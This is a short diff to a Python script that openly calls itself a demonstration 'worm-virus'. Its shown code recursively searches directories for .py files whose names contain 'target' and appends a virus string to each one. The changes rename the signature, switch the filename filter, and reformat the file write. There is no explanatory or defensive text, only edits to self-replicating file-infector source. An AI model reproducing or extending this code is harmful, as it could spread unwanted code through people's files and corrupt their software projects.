@@ -1,9 +1,9 @@
 import os
 
-SIGNATURE = "This is a demonstration of a virus."
+SIGNATURE = "This is a demonstration of a worm-virus."
 
 
-# Only infects python files with "infect" in the filename
+# Only infects python files with "target" in the filename
 def search(path):
     files_to_infect_lst = []
     file_list = os.listdir(path)
@@ -11,7 +11,7 @@ def search(path):
         full_path = os.path.join(path, filename)
         if os.path.isdir(full_path):
             files_to_infect_lst.extend(search(full_path))
-        elif "infect" in filename and filename[-3:] == ".py":
+        elif "target" in filename and filename[-3:] == ".py":
             files_to_infect_lst.append(full_path)
     return files_to_infect_lst
 
@@ -28,7 +28,7 @@ def infect(files_to_infect):
         temp = f.read()
         f.close()
         f = open(filename, "w")
-        f.write(temp + "\n" + virus_string)
+        f.write(f"{temp} \n{virus_string}")
         print(f"{filename} infected.")
         f.close()
 
